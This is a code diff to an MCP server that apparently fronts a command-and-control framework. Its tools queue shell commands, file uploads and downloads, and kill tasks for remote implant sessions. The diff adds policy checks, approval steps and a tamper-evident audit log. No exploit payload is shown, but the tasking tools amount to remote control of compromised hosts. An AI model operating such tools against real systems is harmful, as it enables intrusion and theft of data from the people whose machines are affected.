@@ -55,10 +55,15 @@ PROJECT_ROOT = Path(__file__).parent
 sys.path.insert(0, str(PROJECT_ROOT))
 
 from major.db import (
-    init_db, get_session, list_sessions, kill_session, update_session_info,
-    create_task, get_task, list_tasks, get_pending_tasks,
-    store_file, get_file, list_files,
-    log_event, get_events
+    get_session, list_sessions, kill_session, get_task, list_tasks,
+    list_files, get_events,
+    get_approval_request, list_approval_requests, resolve_approval_request,
+    append_immutable_audit_event, get_immutable_audit, verify_immutable_audit_chain,
+)
+from major.governance import (
+    queue_task_with_policy,
+    format_risk_matrix,
+    normalize_args_string,
 )
 
 mcp_server = FastMCP(
@@ -286,10 +291,23 @@ def ursa_kill_session(session_id: str) -> str:
     if not s:
         return f"Session {session_id} not found."
 
-    # Queue a kill task so the implant self-terminates
-    create_task(session_id, "kill")
+    decision = queue_task_with_policy(
+        session_id=session_id,
+        task_type="kill",
+        args={},
+        actor="mcp:ursa_kill_session",
+    )
+    if decision["status"] == "approval_required":
+        return (
+            f"Kill action requires approval ({decision['risk_level']} risk).\n"
+            f"Approval ID: {decision['approval_id']}\n"
+            f"Use ursa_approve('{decision['approval_id']}') to proceed."
+        )
     kill_session(session_id)
-    return f"Session {session_id} ({s['username']}@{s['hostname']}) killed. Kill task queued."
+    return (
+        f"Session {session_id} ({s['username']}@{s['hostname']}) killed.\n"
+        f"Kill task queued: {decision['task_id']}"
+    )
 
 
 # ── Tasking ──
@@ -313,7 +331,19 @@ def ursa_shell(session_id: str, command: str) -> str:
     if s["status"] == "dead":
         return f"Session {session_id} is dead. Cannot issue tasks."
 
-    task_id = create_task(session_id, "shell", {"command": command})
+    decision = queue_task_with_policy(
+        session_id=session_id,
+        task_type="shell",
+        args={"command": command},
+        actor="mcp:ursa_shell",
+    )
+    if decision["status"] == "approval_required":
+        return (
+            f"Shell task requires approval ({decision['risk_level']} risk).\n"
+            f"Approval ID: {decision['approval_id']}\n"
+            f"{decision['message']}"
+        )
+    task_id = decision["task_id"]
     return (f"Shell task queued: {task_id}\n"
             f"Target: {s['username']}@{s['hostname']}\n"
             f"Command: {command}\n"
@@ -338,11 +368,24 @@ def ursa_task(session_id: str, task_type: str, args: str = "{}") -> str:
         return f"Session {session_id} not found."
 
     try:
-        task_args = json.loads(args) if isinstance(args, str) else args
-    except json.JSONDecodeError:
-        return f"Invalid JSON args: {args}"
+        task_args = normalize_args_string(args)
+    except ValueError as exc:
+        return str(exc)
 
-    task_id = create_task(session_id, task_type, task_args)
+    decision = queue_task_with_policy(
+        session_id=session_id,
+        task_type=task_type,
+        args=task_args,
+        actor="mcp:ursa_task",
+    )
+    if decision["status"] == "approval_required":
+        return (
+            f"Task requires approval ({decision['risk_level']} risk).\n"
+            f"Approval ID: {decision['approval_id']}\n"
+            f"Type: {task_type}\n"
+            f"Args: {json.dumps(task_args)}"
+        )
+    task_id = decision["task_id"]
     return (f"Task queued: {task_id}\n"
             f"Type: {task_type}\n"
             f"Args: {json.dumps(task_args)}\n"
@@ -434,7 +477,18 @@ def ursa_download(session_id: str, remote_path: str) -> str:
     if not s:
         return f"Session {session_id} not found."
 
-    task_id = create_task(session_id, "download", {"path": remote_path})
+    decision = queue_task_with_policy(
+        session_id=session_id,
+        task_type="download",
+        args={"path": remote_path},
+        actor="mcp:ursa_download",
+    )
+    if decision["status"] == "approval_required":
+        return (
+            f"Download task requires approval ({decision['risk_level']} risk).\n"
+            f"Approval ID: {decision['approval_id']}"
+        )
+    task_id = decision["task_id"]
     return (f"Download task queued: {task_id}\n"
             f"Target file: {remote_path}\n"
             f"Will transfer on next beacon check-in.")
@@ -461,10 +515,18 @@ def ursa_upload(session_id: str, local_path: str, remote_path: str) -> str:
     with open(local_path_expanded, "rb") as f:
         data = f.read()
 
-    task_id = create_task(session_id, "upload", {
-        "path": remote_path,
-        "data": base64.b64encode(data).decode(),
-    })
+    decision = queue_task_with_policy(
+        session_id=session_id,
+        task_type="upload",
+        args={"path": remote_path, "data": base64.b64encode(data).decode()},
+        actor="mcp:ursa_upload",
+    )
+    if decision["status"] == "approval_required":
+        return (
+            f"Upload task requires approval ({decision['risk_level']} risk).\n"
+            f"Approval ID: {decision['approval_id']}"
+        )
+    task_id = decision["task_id"]
     return (f"Upload task queued: {task_id}\n"
             f"File: {local_path} ({len(data)} bytes) → {remote_path}")
 
@@ -519,6 +581,136 @@ def ursa_events(limit: int = 30, level: str | None = None) -> str:
         sid = f" [{e['session_id']}]" if e.get("session_id") else ""
         lines.append(f"[{ts}] {e['level'].upper():<7} {e['source']}{sid}: {e['message']}")
 
+    return "\n".join(lines)
+
+
+# ── Governance ──
+
+
+@mcp_server.tool()
+def ursa_policy_matrix() -> str:
+    """Show the Ursa unified policy/risk matrix."""
+    return "URSA POLICY MATRIX\n==================\n" + format_risk_matrix()
+
+
+@mcp_server.tool()
+def ursa_approvals(status: str = "pending", limit: int = 20) -> str:
+    """
+    List governance step-up approval requests.
+
+    Args:
+        status: Filter by status ("pending", "approved", "rejected")
+        limit: Max rows to return
+    """
+    rows = list_approval_requests(status=status, limit=limit)
+    if not rows:
+        return f"No {status} approvals."
+
+    lines = [
+        f"{'ID':<10} {'Risk':<10} {'Action':<12} {'Session':<10} {'By':<20} {'Age'}",
+        "-" * 85,
+    ]
+    for row in rows:
+        lines.append(
+            f"{row['id']:<10} {row['risk_level']:<10} {row['action']:<12} "
+            f"{(row.get('session_id') or '-'): <10} {row['requested_by']:<20} "
+            f"{_time_ago(row['created_at'])}"
+        )
+    return "\n".join(lines)
+
+
+@mcp_server.tool()
+def ursa_approve(approval_id: str, note: str = "") -> str:
+    """
+    Approve a pending request and queue its original task.
+
+    Args:
+        approval_id: Approval request ID
+        note: Optional decision note
+    """
+    req = get_approval_request(approval_id)
+    if not req:
+        return f"Approval {approval_id} not found."
+    if req["status"] != "pending":
+        return f"Approval {approval_id} is already {req['status']}."
+
+    if not resolve_approval_request(approval_id, approved=True, decided_by="mcp:operator", note=note):
+        return f"Approval {approval_id} could not be updated."
+
+    args = json.loads(req.get("args") or "{}")
+    decision = queue_task_with_policy(
+        session_id=req["session_id"],
+        task_type=req.get("task_type") or "shell",
+        args=args,
+        actor="mcp:ursa_approve",
+        approval_id=approval_id,
+    )
+    append_immutable_audit_event(
+        actor="mcp:ursa_approve",
+        action="approval_decision",
+        session_id=req.get("session_id"),
+        approval_id=approval_id,
+        risk_level=req.get("risk_level", "unknown"),
+        policy_result="approved",
+        details={"note": note},
+    )
+    if decision["status"] != "queued":
+        return f"Approval {approval_id} recorded, but task was not queued: {decision['message']}"
+    return f"Approval {approval_id} approved. Task queued: {decision['task_id']}"
+
+
+@mcp_server.tool()
+def ursa_reject(approval_id: str, note: str = "") -> str:
+    """
+    Reject a pending approval request.
+
+    Args:
+        approval_id: Approval request ID
+        note: Optional reason for rejection
+    """
+    req = get_approval_request(approval_id)
+    if not req:
+        return f"Approval {approval_id} not found."
+    if req["status"] != "pending":
+        return f"Approval {approval_id} is already {req['status']}."
+
+    if not resolve_approval_request(approval_id, approved=False, decided_by="mcp:operator", note=note):
+        return f"Approval {approval_id} could not be updated."
+    append_immutable_audit_event(
+        actor="mcp:ursa_reject",
+        action="approval_decision",
+        session_id=req.get("session_id"),
+        approval_id=approval_id,
+        risk_level=req.get("risk_level", "unknown"),
+        policy_result="rejected",
+        details={"note": note},
+    )
+    return f"Approval {approval_id} rejected."
+
+
+@mcp_server.tool()
+def ursa_audit_integrity(limit: int = 50) -> str:
+    """
+    Verify immutable audit chain integrity and show recent audit events.
+
+    Args:
+        limit: Number of recent events to show after verification
+    """
+    check = verify_immutable_audit_chain()
+    rows = get_immutable_audit(limit=limit)
+    status_line = (
+        f"Audit chain integrity: OK ({check['checked']} events checked)"
+        if check["ok"]
+        else f"Audit chain integrity: FAILED at {check['failed_event']} after {check['checked']} checks"
+    )
+    if not rows:
+        return status_line + "\nNo immutable audit events."
+    lines = [status_line, "", "Recent immutable events:"]
+    for row in rows[: min(limit, 20)]:
+        lines.append(
+            f"[{_format_time(row['timestamp'])}] {row['actor']} {row['action']} "
+            f"risk={row['risk_level']} result={row['policy_result']}"
+        )
     return "\n".join(lines)
 
 
